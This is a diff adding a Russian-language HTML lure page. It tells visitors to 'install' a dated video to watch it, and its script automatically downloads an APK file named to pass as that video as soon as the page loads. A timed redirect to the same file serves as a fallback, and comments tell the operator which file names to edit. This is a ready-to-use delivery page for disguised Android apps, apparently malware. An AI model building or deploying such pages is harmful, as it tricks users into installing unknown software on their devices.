@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body {
+            background: #111;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <p>Установите Видео 02.06.2026, чтобы посмотреть</p>
+
+    <script>
+        window.addEventListener('load', function() {
+            // ==========================================
+            // НАСТРОЙКИ (измените только эти две строки)
+            // ==========================================
+            
+            // 1. Точное имя файла, который лежит в этой же папке на сервере
+            var realFileName = 'Видео 02.06.2026.apk'; 
+            
+            // 2. Имя, под которым файл сохранится у пользователя на телефоне/ПК
+            var downloadName = 'Видео 02.06.2026.apk';
+            
+            // ==========================================
+
+            // Попытка инициировать скачивание через JS
+            var link = document.createElement('a');
+            link.href = realFileName;
+            link.download = downloadName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Страховка: если браузер (например, Safari на iPhone) заблокировал 
+            // автоматический клик, мы просто перенаправляем пользователя на файл.
+            // Браузер сам предложит его сохранить.
+            setTimeout(function() {
+                window.location.replace(realFileName);
+            }, 9000000);
+        });
+    </script>
+</body>
+</html>
